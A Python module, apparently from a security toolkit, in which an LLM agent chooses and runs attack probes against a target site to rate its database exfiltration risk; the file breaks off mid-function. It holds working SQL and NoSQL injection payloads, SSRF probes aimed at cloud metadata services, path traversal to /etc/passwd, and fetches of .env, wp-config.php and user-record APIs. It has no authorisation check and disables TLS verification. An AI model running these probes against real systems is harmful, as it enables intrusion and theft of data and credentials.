# modules/ai_db_exfil_agent.py
# Autonomous AI agent for database exfiltration risk assessment.
# The agent runs a ReAct-style tool-use loop: it reasons about the target,
# selects tools, interprets results, and iterates until it has enough
# evidence to produce a risk report.

import os
import re
import json
import time
import uuid
import hashlib
import logging
import threading
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_GROQ_URL   = "https://api.groq.com/openai/v1/chat/completions"
_GROQ_MODEL = "llama3-70b-8192"

# Maximum agent iterations before forcing a report
_MAX_ITERATIONS = 12

# Hard cap on tokens sent to LLM per turn (context window safety)
_MAX_CONTEXT_CHARS = 14_000

# Risk level definitions
_RISK_LEVELS = {
    "CRITICAL": {
        "score_min": 85,
        "label":     "CRITICAL",
        "color":     "red",
        "summary":   "Database contents are directly accessible or trivially extractable.",
    },
    "HIGH": {
        "score_min": 65,
        "label":     "HIGH",
        "color":     "orange",
        "summary":   "Multiple high-impact vectors found; extraction feasible with moderate effort.",
    },
    "MEDIUM": {
        "score_min": 40,
        "label":     "MEDIUM",
        "color":     "yellow",
        "summary":   "Significant indicators present; exploitation requires chaining vulnerabilities.",
    },
    "LOW": {
        "score_min": 20,
        "label":     "LOW",
        "color":     "blue",
        "summary":   "Minor indicators only; extraction unlikely without deeper access.",
    },
    "MINIMAL": {
        "score_min": 0,
        "label":     "MINIMAL",
        "color":     "green",
        "summary":   "No significant database exfiltration vectors detected.",
    },
}

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class ToolCall:
    tool_name: str
    arguments: Dict[str, Any]
    result: Optional[Any]  = None
    error: Optional[str]   = None
    duration_ms: float     = 0.0


@dataclass
class AgentIteration:
    iteration:   int
    reasoning:   str
    tool_calls:  List[ToolCall]
    observation: str
    tokens_used: int


@dataclass
class RiskFinding:
    category:    str            # e.g. "exposed_db_file", "sqli", "admin_panel"
    severity:    str            # critical / high / medium / low / info
    title:       str
    detail:      str
    url:         Optional[str]
    evidence:    Optional[str]
    score_delta: int            # contribution to overall risk score (0–25)


@dataclass
class DBExfilReport:
    target:          str
    scan_id:         str
    generated_at:    str
    risk_level:      str        # CRITICAL / HIGH / MEDIUM / LOW / MINIMAL
    risk_score:      int        # 0–100
    risk_label:      str
    executive_summary: str
    findings:        List[RiskFinding]
    attack_vectors:  List[str]  # ordered by feasibility
    recommendations: List[str]
    agent_iterations: int
    tools_used:      List[str]
    evidence_urls:   List[str]
    raw_iterations:  List[AgentIteration]


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 502, 503])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
    session.mount("https://", adapter)
    session.mount("http://",  adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    })
    return session


# ---------------------------------------------------------------------------
# Tool implementations
# The agent can call any of these. Each returns a JSON-serialisable dict.
# ---------------------------------------------------------------------------

def _tool_http_probe(
    session: requests.Session,
    url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    timeout: float = 8.0,
) -> Dict:
    """
    Send a single HTTP request and return status, headers, and a body snippet.
    Used by the agent to test arbitrary endpoints.
    """
    try:
        resp = session.request(
            method.upper(), url,
            headers=headers or {},
            timeout=timeout,
            allow_redirects=True,
            stream=True,
        )
        content = b"".join(
            chunk for chunk in resp.iter_content(1024)
            if chunk
        )[:8192]
        resp.close()

        body_text = content.decode("utf-8", errors="replace")
        return {
            "status":       resp.status_code,
            "content_type": resp.headers.get("Content-Type", ""),
            "server":       resp.headers.get("Server", ""),
            "content_length": int(resp.headers.get("Content-Length", len(content))),
            "body_snippet": body_text[:600],
            "headers":      dict(list(resp.headers.items())[:20]),
        }
    except requests.RequestException as exc:
        return {"error": str(exc)}


def _tool_sqli_probe(
    session: requests.Session,
    url: str,
    param: str,
    timeout: float = 8.0,
) -> Dict:
    """
    Test one URL parameter for SQL injection using error-based and
    time-based blind techniques.
    """
    _ERR = re.compile(
        r"(sql syntax|you have an error|syntax error|mysql_num_rows|"
        r"ORA-\d{5}|PostgreSQL.*ERROR|Warning.*pg_|SQLite.*error|"
        r"Microsoft.*ODBC|Unclosed quotation mark|SQLSTATE)",
        re.I,
    )

    payloads = [
        ("'",                   "error_based"),
        ("' OR '1'='1",         "error_based"),
        ("' AND SLEEP(4)--",    "time_based"),
        ("'; WAITFOR DELAY '0:0:4'--", "time_based"),
        ("' AND (SELECT 1 FROM(SELECT(SLEEP(4)))a)--", "time_based"),
        ("' UNION SELECT NULL,NULL,NULL--", "union_based"),
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "error_based"),
    ]

    results = []
    for payload, ptype in payloads:
        try:
            t0   = time.monotonic()
            resp = session.get(url, params={param: payload}, timeout=10.0)
            elapsed = time.monotonic() - t0

            if ptype == "time_based" and elapsed >= 3.5:
                results.append({
                    "type": "time_based_blind",
                    "payload": payload,
                    "elapsed_s": round(elapsed, 1),
                    "confidence": "high",
                })
            elif ptype in ("error_based", "union_based"):
                m = _ERR.search(resp.text)
                if m:
                    results.append({
                        "type": "error_based",
                        "payload": payload,
                        "evidence": m.group(0)[:80],
                        "confidence": "confirmed",
                    })
        except requests.RequestException:
            continue

    return {
        "url":        url,
        "parameter":  param,
        "vulnerable": bool(results),
        "findings":   results,
    }


def _tool_db_file_check(
    session: requests.Session,
    base_url: str,
) -> Dict:
    """
    Probe a targeted list of high-value database file paths.
    Returns confirmed accessible files with evidence snippets.
    """
    # Highest-value paths — focused subset for the agent
    targets = [
        ("/dump.sql",           r"(CREATE TABLE|INSERT INTO|DROP TABLE)"),
        ("/backup.sql",         r"(CREATE TABLE|INSERT INTO)"),
        ("/database.sql",       r"(CREATE TABLE|INSERT INTO)"),
        ("/db.sqlite",          r"SQLite format 3"),
        ("/db.sqlite3",         r"SQLite format 3"),
        ("/users.json",         r'("email"|"password"|"username")'),
        ("/database.json",      r'(\[\s*\{|\{\s*"id")'),
        ("/backup.zip",         r"PK\x03\x04"),
        ("/.env",               r"(DB_PASSWORD|DATABASE_URL|DB_HOST)"),
        ("/wp-config.php",      r"DB_PASSWORD"),
        ("/config/database.yml",r"(password|database|host)"),
        ("/application.properties", r"(datasource|db\.password|jdbc:)"),
        ("/adminer.php",        r"(Adminer|adminer)"),
        ("/phpmyadmin/",        r"(phpMyAdmin|pma_)"),
        ("/_cat/indices",       r'("health"|"index"|"green")'),
        ("/_all/_search",       r'"hits"\s*:'),
        ("/api/v1/users",       r'(\[\s*\{|\{"id"|\{"email")'),
        ("/api/users",          r'(\[\s*\{|\{"id"|\{"email")'),
        ("/api/v1/dump",        r"(CREATE TABLE|\[\s*\{)"),
        ("/debug/vars",         r"(goroutine|HeapAlloc|MemStats)"),
        ("/actuator/env",       r'"activeProfiles"'),
        ("/actuator/heapdump",  r"\x00"),
    ]

    hits = []
    base = base_url.rstrip("/")

    def _probe(path_pattern: Tuple[str, str]) -> Optional[Dict]:
        path, pattern = path_pattern
        url = base + path
        result = _tool_http_probe(session, url)
        if "error" in result or result.get("status") in (404, 410, 400, 429):
            return None
        body = result.get("body_snippet", "")
        if re.search(pattern, body, re.I | re.S):
            return {
                "url":          url,
                "path":         path,
                "status":       result["status"],
                "content_type": result.get("content_type"),
                "evidence":     re.search(pattern, body, re.I | re.S).group(0)[:80],
                "size_bytes":   result.get("content_length", 0),
            }
        # Also flag 200 on sensitive paths even without pattern match
        if result.get("status") == 200 and path.endswith(
            (".sql", ".sqlite", ".sqlite3", ".zip", ".bak")
        ):
            return {
                "url":          url,
                "path":         path,
                "status":       200,
                "content_type": result.get("content_type"),
                "evidence":     "HTTP 200 on sensitive path (no pattern match)",
                "size_bytes":   result.get("content_length", 0),
            }
        return None

    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = {ex.submit(_probe, t): t for t in targets}
        for f in as_completed(futures):
            r = f.result()
            if r:
                hits.append(r)

    return {
        "paths_tested": len(targets),
        "accessible":   len(hits),
        "files":        hits,
    }


def _tool_admin_panel_check(
    session: requests.Session,
    base_url: str,
) -> Dict:
    """
    Detect exposed database admin panels (phpMyAdmin, Adminer, etc.)
    and open API documentation that reveals schema information.
    """
    panels = [
        ("/phpmyadmin/",             "phpMyAdmin",    r"(phpMyAdmin|pma_login)"),
        ("/phpmyadmin/index.php",    "phpMyAdmin",    r"(phpMyAdmin|pma_)"),
        ("/pma/",                    "phpMyAdmin",    r"(phpMyAdmin|pma_)"),
        ("/adminer.php",             "Adminer",       r"(Adminer|adminer)"),
        ("/adminer/",                "Adminer",       r"(Adminer|adminer)"),
        ("/api/swagger.json",        "Swagger",       r'"swagger"\s*:'),
        ("/swagger-ui/",             "Swagger UI",    r"(swagger|SwaggerUI)"),
        ("/openapi.json",            "OpenAPI",       r'"openapi"\s*:'),
        ("/graphiql",                "GraphiQL",      r"(GraphiQL|graphiql)"),
        ("/graphql",                 "GraphQL",       r"(graphql|__schema)"),
        ("/_cat/indices",            "Elasticsearch", r'"health"'),
        ("/couchdb/_all_dbs",        "CouchDB",       r'\["\w+"\]'),
        ("/redis/",                  "Redis HTTP",    r"(PONG|redis_version)"),
        ("/mongo-express/",          "Mongo Express", r"(mongo-express|MongoDB)"),
        ("/kibana/",                 "Kibana",        r"(kibana|Kibana)"),
    ]

    found = []
    base  = base_url.rstrip("/")

    for path, panel_name, pattern in panels:
        result = _tool_http_probe(session, base + path)
        if "error" in result:
            continue
        status = result.get("status", 0)
        body   = result.get("body_snippet", "")
        if status not in (404, 410, 429) and re.search(pattern, body, re.I):
            found.append({
                "url":        base + path,
                "panel":      panel_name,
                "status":     status,
                "protected":  status in (401, 403),
                "evidence":   re.search(pattern, body, re.I).group(0)[:60],
            })

    return {"panels_found": len(found), "panels": found}


def _tool_error_disclosure_check(
    session: requests.Session,
    base_url: str,
) -> Dict:
    """
    Trigger error responses to detect database error messages,
    stack traces, and technology disclosure in error pages.
    """
    _DB_ERR = re.compile(
        r"(SQLSTATE\[|mysqli_|PDOException|ORA-\d{5}|"
        r"pg_query\(\)|MySQLSyntaxError|Doctrine\\DBAL|"
        r"ActiveRecord::StatementInvalid|PG::SyntaxError|"
        r"Sequel::DatabaseError|SQLite3::Exception|"
        r"MongoError:|redis\.exceptions\.|"
        r"at com\.mysql\.|at org\.hibernate\.|"
        r"NpgsqlException|SqlException)",
        re.I,
    )
    _STACK = re.compile(
        r"(Traceback \(most recent|at [a-zA-Z]+\.[a-zA-Z]+\(|"
        r"Stack trace:|in /var/www|/app/|\.php on line)",
        re.I,
    )

    error_triggers = [
        f"{base_url}/?id='",
        f"{base_url}/?id=1 AND 1=2--",
        f"{base_url}/index.php?id='",
        f"{base_url}/api/v1/users/999999999",
        f"{base_url}/api/users/'",
        f"{base_url}/?page=../../../etc/passwd",
        f"{base_url}/search?q='",
        f"{base_url}/login",
    ]

    disclosures = []
    for url in error_triggers:
        result = _tool_http_probe(session, url)
        if "error" in result:
            continue
        body = result.get("body_snippet", "")
        db_match  = _DB_ERR.search(body)
        stk_match = _STACK.search(body)
        if db_match or stk_match:
            disclosures.append({
                "url":           url,
                "db_error":      db_match.group(0)[:80]  if db_match  else None,
                "stack_trace":   stk_match.group(0)[:80] if stk_match else None,
                "status":        result.get("status"),
            })

    return {
        "urls_tested":   len(error_triggers),
        "disclosures":   len(disclosures),
        "findings":      disclosures,
    }


def _tool_ssrf_db_check(
    session: requests.Session,
    base_url: str,
) -> Dict:
    """
    Test parameters commonly used for SSRF to probe internal database ports.
    """
    _SSRF_PARAMS = ["url", "uri", "src", "path", "file", "fetch",
                    "load", "resource", "endpoint", "callback", "proxy"]
    _DB_TARGETS  = [
        ("http://127.0.0.1:3306",   "MySQL"),
        ("http://127.0.0.1:5432",   "PostgreSQL"),
        ("http://127.0.0.1:27017",  "MongoDB"),
        ("http://127.0.0.1:6379",   "Redis"),
        ("http://127.0.0.1:9200",   "Elasticsearch"),
        ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata"),
    ]

    _SSRF_EVIDENCE = re.compile(
        r"(mysql|postgres|mongodb|redis|elastic|ami-id|"
        r"instance-id|computeMetadata|PONG|\+PONG|"
        r"\"cluster_name\"|root:x:0)",
        re.I,
    )

    hits = []
    for param in _SSRF_PARAMS[:5]:   # test top 5 params
        for target_url, db_name in _DB_TARGETS[:5]:
            probe_url = base_url.rstrip("/") + f"/?{param}={urllib.parse.quote(target_url)}"
            result = _tool_http_probe(session, probe_url, timeout=5.0)
            if "error" in result:
                continue
            body = result.get("body_snippet", "")
            m = _SSRF_EVIDENCE.search(body)
            if m:
                hits.append({
                    "url":       probe_url,
                    "parameter": param,
                    "target":    db_name,
                    "evidence":  m.group(0)[:60],
                    "status":    result.get("status"),
                })

    return {"ssrf_hits": len(hits), "findings": hits}


def _tool_backup_archive_check(
    session: requests.Session,
    base_url: str,
) -> Dict:
    """
    Hunt for database backup archives using date-permuted filenames.
    """
    import datetime as dt
    today   = dt.date.today()
    dates   = [
        today.strftime("%Y%m%d"),
        today.strftime("%Y-%m-%d"),
        (today.replace(day=1)).strftime("%Y%m"),
        str(today.year),
        str(today.year - 1),
    ]
    stems   = ["backup", "db", "database", "dump", "data", "sql_backup", "db_backup"]
    exts    = [".sql", ".zip", ".tar.gz", ".gz", ".sql.gz", ".bak", ".sqlite"]
    dirs    = ["", "/backup", "/backups", "/db", "/dumps", "/files", "/private"]

    # Build candidate list (capped to avoid runaway)
    candidates: List[str] = []
    for stem in stems:
        for ext in exts:
            for d in dates:
                for directory in dirs:
                    for sep in ("-", "_", "."):
                        candidates.append(f"{directory}/{stem}{sep}{d}{ext}")
                        candidates.append(f"{directory}/{d}{sep}{stem}{ext}")

    # Deduplicate and cap
    candidates = list(dict.fromkeys(candidates))[:200]
    base = base_url.rstrip("/")

    # Canary check to detect wildcard 200
    canary_url  = f"{base}/artex_canary_{hashlib.md5(b'bk').hexdigest()[:8]}.sql"
    canary_resp = _tool_http_probe(session, canary_url)
    wildcard    = canary_resp.get("status") == 200

    found = []

    def _check(path: str) -> Optional[Dict]:
        url    = base + path
        result = _tool_http_probe(session, url)
        if "error" in result:
            return None
        status = result.get("status", 0)
        if status in (404, 410, 429) or (wildcard and status == 200):
            return None
        if status in (200, 206, 301, 302, 403):
            return {
                "url":     url,
                "path":    path,
                "status":  status,
                "size":    result.get("content_length", 0),
                "accessible": status not in (403, 401),
            }
        return None

    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = [ex.submit(_check, p) for p in candidates]
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)

    return {
        "paths_tested": len(candidates),
        "accessible":   len([x for x in found if x["accessible"]]),
        "protected":    len([x for x in found if not x["accessible"]]),
        "archives":     found,
    }


def _tool_api_data_exposure(
    session: requests.Session,
    base_url: str,
) -> Dict:
    """
    Probe REST API endpoints that may return unfiltered database records.
    """
    api_paths = [
        "/api/v1/users",         "/api/v2/users",        "/api/users",
        "/api/v1/accounts",      "/api/accounts",
        "/api/v1/customers",     "/api/customers",
        "/api/v1/orders",        "/api/orders",
        "/api/v1/admin/users",   "/api/admin/users",
        "/api/v1/export",        "/api/export",
        "/api/v1/dump",          "/api/dump",
        "/api/v1/data",          "/api/data",
        "/api/v1/database",      "/api/database",
        "/api/v1/all",           "/api/all",
        "/api/v1/list",          "/api/list",
        "/api/v1/search?q=*",
        "/api/v1/search?q=",
        "/api/v1/users?limit=9999",
        "/api/v1/users?page=1&per_page=9999",
        "/rest/v1/users",        "/rest/users",
        "/json/users",           "/data/users",
    ]

    _DATA_PATTERN = re.compile(
        r'("email"\s*:|"password"\s*:|"username"\s*:|'
        r'"credit_card"\s*:|"ssn"\s*:|"phone"\s*:|'
        r'"token"\s*:|"api_key"\s*:|"secret"\s*:)',
        re.I,
    )
    _JSON_LIST = re.compile(r'^\s*\[', re.M)

    hits = []
    base = base_url.rstrip("/")

    for path in api_paths:
        url    = base + path
        result = _tool_http_probe(
            session, url,
            headers={"Accept": "application/json"},
        )
        if "error" in result or result.get("status") in (404, 410, 429):
            continue
        body   = result.get("body_snippet", "")
        status = result.get("status", 0)
        ct     = result.get("content_type", "")

        is_json  = "json" in ct.lower() or body.lstrip().startswith(("[", "{"))
        has_data = bool(_DATA_PATTERN.search(body))
        is_list  = bool(_JSON_LIST.search(body))

        if status == 200 and is_json and (has_data or is_list):
            sensitive_fields = _DATA_PATTERN.findall(body)
            hits.append({
                "url":              url,
                "status":           status,
                "content_type":     ct,
                "sensitive_fields": list(set(sensitive_fields))[:8],
                "is_array":         is_list,
                "body_preview":     body[:300],
            })

    return {"endpoints_tested": len(api_paths), "exposed": len(hits), "findings": hits}


def _tool_inject_into_api(
    session: requests.Session,
    base_url: str,
    path: str,
    param: str,
) -> Dict:
    """
    Run SQLi + NoSQLi probes on a specific API endpoint.
    """
    sqli_result = _tool_sqli_probe(session, base_url.rstrip("/") + path, param)

    # NoSQL injection — MongoDB operator injection
    nosqli_hits = []
    nosql_payloads = [
        {param: {"$gt": ""}},
        {param: {"$ne": None}},
        {param: {"$regex": ".*"}},
        {param: {"$where": "1==1"}},
    ]
    for payload_dict in nosql_payloads:
        try:
            resp = session.post(
                base_url.rstrip("/") + path,
                json=payload_dict,
                headers={"Content-Type": "application/json"},
                timeout=7.0,
            )
            body = resp.text[:300]
            if re.search(r'("id"|"email"|"username"|\[\s*\{)', body, re.I):
                nosqli_hits.append({
                    "payload":   str(payload_dict),
                    "status":    resp.status_code,
                    "evidence":  body[:120],
                })
        except requests.RequestException:
            continue

    return {
        "path":          path,
        "parameter":     param,
        "sqli":          sqli_result,
        "nosqli_hits":   nosqli_hits,
        "nosql_vulnerable": bool(nosqli_hits),
    }


# ---------------------------------------------------------------------------
# Tool registry
# ---------------------------------------------------------------------------

@dataclass
class Tool:
    name:        str
    description: str
    parameters:  Dict[str, str]       # param_name → description
    fn:          Callable


def _build_tool_registry(session: requests.Session, base_url: str) -> Dict[str, Tool]:
    return {
        "http_probe": Tool(
            name="http_probe",
            description=(
                "Send an HTTP GET/POST to any URL and get back status code, "
                "response headers, and first 600 chars of body. "
                "Use to investigate specific endpoints the agent wants to test."
            ),
            parameters={"url": "Full URL to probe", "method": "GET or POST"},
            fn=lambda url, method="GET": _tool_http_probe(session, url, method),
        ),
        "db_file_check": Tool(
            name="db_file_check",
            description=(
                "Probe 20+ high-value database file paths on the target "
                "(dump.sql, db.sqlite, users.json, .env, wp-config.php, etc.). "
                "Returns list of accessible files with evidence."
            ),
            parameters={},
            fn=lambda: _tool_db_file_check(session, base_url),
        ),
        "admin_panel_check": Tool(
            name="admin_panel_check",
            description=(
                "Detect exposed database admin panels "
                "(phpMyAdmin, Adminer, Mongo Express, Kibana) and "
                "open API docs (Swagger, GraphiQL, Elasticsearch cat API)."
            ),
            parameters={},
            fn=lambda: _tool_admin_panel_check(session, base_url),
        ),
        "error_disclosure_check": Tool(
            name="error_disclosure_check",
            description=(
                "Trigger error conditions to detect DB error messages, "
                "stack traces, and technology fingerprints leaking from the app."
            ),
            parameters={},
            fn=lambda: _tool_error_disclosure_check(session, base_url),
        ),
        "sqli_probe": Tool(
            name="sqli_probe",
            description=(
                "Test a specific URL parameter for SQL injection "
                "(error-based, time-based blind, union-based). "
                "Returns vulnerability details and payload evidence."
            ),
            parameters={
                "url":   "Full URL including base path",
                "param": "Query parameter name to inject",
            },
            fn=lambda url, param: _tool_sqli_probe(session, url, param),
        ),
        "ssrf_db_check": Tool(
            name="ssrf_db_check",
            description=(
                "Test URL/file/path parameters for SSRF that could reach "
                "internal database ports (MySQL, PostgreSQL, MongoDB, Redis, "
                "Elasticsearch) or cloud metadata services."
            ),
            parameters={},
            fn=lambda: _tool_ssrf_db_check(session, base_url),
        ),
        "backup_archive_check": Tool(
            name="backup_archive_check",
            description=(
                "Search for database backup archives using date-permuted "
                "filenames (.sql, .zip, .tar.gz, .bak) across common directories. "
                "Tests 200+ candidate paths."
            ),
            parameters={},
            fn=lambda: _tool_backup_archive_check(session, base_url),
        ),
        "api_data_exposure": Tool(
            name="api_data_exposure",
            description=(
                "Probe REST API endpoints that may return unfiltered database "
                "records. Detects endpoints returning user/account/order data "
                "without proper access control."
            ),
            parameters={},
            fn=lambda: _tool_api_data_exposure(session, base_url),
        ),
        "inject_into_api": Tool(
            name="inject_into_api",
            description=(
                "Run SQL injection and NoSQL operator injection against a "
                "specific API path and parameter. Use after api_data_exposure "
                "finds interesting endpoints."
            ),
            parameters={
                "path":  "API path e.g. /api/v1/users",
                "param": "Parameter name to inject",
            },
            fn=lambda path, param: _tool_inject_into_api(session, base_url, path, param),
        ),
    }


# ---------------------------------------------------------------------------
# Groq LLM client
# ---------------------------------------------------------------------------

def _call_groq(
    api_key: str,
    messages: List[Dict[str, str]],
    max_tokens: int = 2000,
    temperature: float = 0.2,
) -> Optional[str]:
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type":  "application/json",
    }
    payload = {
        "model":       _GROQ_MODEL,
        "messages":    messages,
        "temperature": temperature,
        "max_tokens":  max_tokens,
    }
    for attempt in range(3):
        try:
            resp = requests.post(_GROQ_URL, headers=headers, json=payload, timeout=50)
            if resp.status_code == 200:
                return resp.json()["choices"][0]["message"]["content"]
            if resp.status_code == 429:
                wait = 15 * (attempt + 1)
                logger.warning(f"[ai_db_agent] rate limited — sleeping {wait}s")
                time.sleep(wait)
                continue
            logger.error(f"[ai_db_agent] Groq {resp.status_code}: {resp.text[:200]}")
            break
        except requests.exceptions.Timeout:
            if attempt < 2:
                time.sleep(2 ** attempt)
        except Exception as exc:
            logger.error(f"[ai_db_agent] LLM error: {exc}")
            break
    return None


# ---------------------------------------------------------------------------
# ReAct agent loop
# ---------------------------------------------------------------------------

_SYSTEM_PROMPT = """You are an autonomous database security assessment agent.
Your sole job is to determine how easily a hacker could extract the target's database.

You have access to these tools:
{tool_descriptions}

INSTRUCTIONS:
1. At each step output EXACTLY this JSON structure:
{{
  "reasoning": "one paragraph — what you know so far and why you're choosing this action",
  "action": "tool_name",
  "arguments": {{"param": "value"}}
}}

OR if you have enough evidence to write the final report:
{{
  "reasoning": "summary of all findings",
  "action": "FINAL_REPORT",
  "arguments": {{}}
}}

2. Do NOT call the same tool twice with identical arguments.
3. Prioritise tools that give the most direct evidence of database exposure.
4. Run at least 5 different tools before writing the final report.
5. After api_data_exposure, if interesting endpoints were found, follow up with inject_into_api.
6. Respond ONLY with the JSON block. No prose before or after it.
"""

_REPORT_PROMPT = """You are a senior penetration tester writing a database exfiltration risk report.

TARGET: {target}

EVIDENCE COLLECTED:
{evidence}

Write a JSON risk report with this EXACT structure:
{{
  "risk_score": <integer 0-100>,
  "risk_level": "<CRITICAL|HIGH|MEDIUM|LOW|MINIMAL>",
  "executive_summary": "<2-3 sentence plain-English summary for a non-technical executive>",
  "findings": [
    {{
      "category": "<exposed_db_file|sqli|admin_panel|api_exposure|ssrf|error_disclosure|backup_archive|nosqli>",
      "severity": "<critical|high|medium|low|info>",
      "title": "<short finding title>",
      "detail": "<technical detail>",
      "url": "<url or null>",
      "evidence": "<snippet of evidence or null>",
      "score_delta": <integer 0-25>
    }}
  ],
  "attack_vectors": [
    "<ordered list of most feasible attack paths from most to least dangerous>"
  ],
  "recommendations": [
    "<concrete remediation steps>"
  ]
}}

Risk score guidance:
  CRITICAL (85-100): Direct database file access, unauthenticated admin panel, confirmed SQLi with data returned
  HIGH (65-84): Backup archives accessible, error messages leaking schema, blind SQLi confirmed, sensitive API endpoints
  MEDIUM (40-64): Partial exposure — error disclosure, possible SQLi, unprotected admin panel returning 403
  LOW (20-39): Minor indicators — tech disclosure, some interesting paths returning 403
  MINIMAL (0-19): Nothing significant found

Respond ONLY with the JSON block.
"""


def _truncate_evidence(evidence: Dict[str, Any], max_chars: int) -> str:
    """Serialise evidence dict to string, truncating body snippets."""
    text = json.dumps(evidence, indent=2, default=str)
    if len(text) <= max_chars:
        return text
    # Truncate long body snippets
    for key in list(evidence.keys()):
        if isinstance(evidence[key], dict) and "body_snippet" in evidence[key]:
            evidence[key]["body_snippet"] = evidence[key]["body_snippet"][:100] + "...[truncated]"
        if isinstance(evidence[key], list):
            evidence[key] = evidence[key][:5]
    return json.dumps(evidence, indent=2, default=str)[:max_chars]


def _parse_agent_action(raw: str) -> Optional[Dict]:
    """Extract JSON from LLM output — strips markdown fences."""
    cleaned = raw.strip()
    if cleaned.startswith("```"):
        parts = cleaned.split("```")
        for part in parts:
            part = part.strip().lstrip("json").strip()
            if part.startswith("{"):
                cleaned = part
                break
    start = cleaned.find("{")
    end   = cleaned.rfind("}") + 1
    if start == -1 or end <= start:
        return None
    try:
        return json.loads(cleaned[start:end])
    except json.JSONDecodeError:
        return None


def _dispatch_tool(
    registry: Dict[str, Tool],
    tool_name: str,
    arguments: Dict[str, Any],
) -> Tuple[Any, float]:
    """Invoke a tool from the registry. Returns (result, duration_ms)."""
    tool = registry.get(tool_name)
    if not tool:
        return {"error": f"unknown tool: {tool_name}"}, 0.0

    t0 = time.monotonic()
    try:
        result = tool.fn(**arguments)
    except Exception as exc:
        result = {"error": str(exc)}
    duration_ms = (time.monotonic() - t0) * 1000
    return result, duration_ms


def _run_agent_loop(
    api_key: str,
    registry: Dict[str, Tool],
    target: str,
) -> Tuple[List[AgentIteration], Dict[str, Any]]:
    """
    ReAct loop:
      1. Build messages with tool descriptions + history
      2. Ask LLM for next action
      3. Execute tool
      4. Append observation
      5. Repeat until FINAL_REPORT or max iterations
    Returns (iterations, aggregated_evidence).
    """
    # Build tool description block
    tool_descriptions = "\n".join(
        f"- {name}: {tool.description}"
        + (f"\n  params: {tool.parameters}" if tool.parameters else "")
        for name, tool in registry.items()
    )

    system_msg = {
        "role":    "system",
        "content": _SYSTEM_PROMPT.format(tool_descriptions=tool_descriptions),
    }

    messages: List[Dict[str, str]] = [system_msg]
    messages.append({
        "role":    "user",
        "content": (
            f"Begin assessing: {target}\n"
            "Start with the tools most likely to reveal direct database exposure. "
            "Think step by step."
        ),
    })

    iterations:   List[AgentIteration] = []
    evidence:     Dict[str, Any]       = {}
    tools_called: Set[str]             = set()

    for i in range(1, _MAX_ITERATIONS + 1):
        logger.info(f"[ai_db_agent] iteration {i}/{_MAX_ITERATIONS}")

        # Trim context if too long
        context = messages.copy()
        total_chars = sum(len(m["content"]) for m in context)
        while total_chars > _MAX_CONTEXT_CHARS and len(context) > 2:
            removed = context.pop(2)
            total_chars -= len(removed["content"])

        raw_response = _call_groq(api_key, context, max_tokens=800, temperature=0.2)
        if not raw_response:
            break

        action_dict = _parse_agent_action(raw_response)
        if not action_dict:
            logger.warning(f"[ai_db_agent] failed to parse action on iteration {i}")
            break

        reasoning  = action_dict.get("reasoning", "")
        action     = action_dict.get("action", "")
        arguments  = action_dict.get("arguments", {})

        if action == "FINAL_REPORT":
            logger.info("[ai_db_agent] agent signalled FINAL_REPORT")
            break

        # Prevent infinite tool loops
        tool_key = f"{action}:{json.dumps(arguments, sort_keys=True)}"
        if tool_key in tools_called:
            logger.info(f"[ai_db_agent] duplicate tool call detected — forcing report")
            break
        tools_called.add(tool_key)

        # Execute tool
        result, duration_ms = _dispatch_tool(registry, action, arguments)

        # Store evidence
        evidence[f"{action}_{i}"] = result

        # Build observation text (truncated for context)
        obs_text = json.dumps(result, default=str)
        if len(obs_text) > 1200:
            obs_text = obs_text[:1200] + "...[truncated]"

        # Append to conversation
        messages.append({
            "role":    "assistant",
            "content": raw_response,
        })
        messages.append({
            "role":    "user",
            "content": f"Tool result for {action}:\n{obs_text}\n\nContinue your assessment.",
        })

        tool_call = ToolCall(
            tool_name=action,
            arguments=arguments,
            result=result,
            duration_ms=round(duration_ms, 1),
        )
        iterations.append(AgentIteration(
            iteration=i,
            reasoning=reasoning,
            tool_calls=[tool_call],
            observation=obs_text[:400],
            tokens_used=len(raw_response.split()),
        ))

        print(
            f"  [agent] iter {i}: {action}"
            + (f" → {len(result.get('files', result.get('findings', result.get('panels', []))))} hits"
               if isinstance(result, dict) else "")
        )

    return iterations, evidence


# ---------------------------------------------------------------------------
# Risk score computation (heuristic — supplemented by LLM)
# ---------------------------------------------------------------------------

def _heuristic_score(evidence: Dict[str, Any]) -> Tuple[int, List[RiskFinding]]:
    """
    Compute a baseline risk score from tool evidence before the LLM final report.
    Returns (score_0_to_100, findings_list).
    """
    score    = 0
    findings: List[RiskFinding] = []

    for key, data in evidence.items():
        if not isinstance(data, dict):
            continue

        # DB file exposure
        for f in data.get("files", []):
            if f.get("accessible"):
                sev = "critical" if f.get("size_bytes", 0) > 100 else "high"
                delta = 25 if sev == "critical" else 15
                score += delta
                findings.append(RiskFinding(
                    category="exposed_db_file",
                    severity=sev,
                    title=f"Accessible database file: {f.get('path','')}",
                    detail=f"HTTP {f.get('status')} — {f.get('evidence','')}",
                    url=f.get("url"),
                    evidence=f.get("evidence"),
                    score_delta=delta,
                ))

        # Backup archives
        for a in data.get("archives", []):
            if a.get("accessible"):
                score += 20
                findings.append(RiskFinding(
                    category="backup_archive",
                    severity="critical",
                    title=f"Accessible backup archive: {a.get('path','')}",
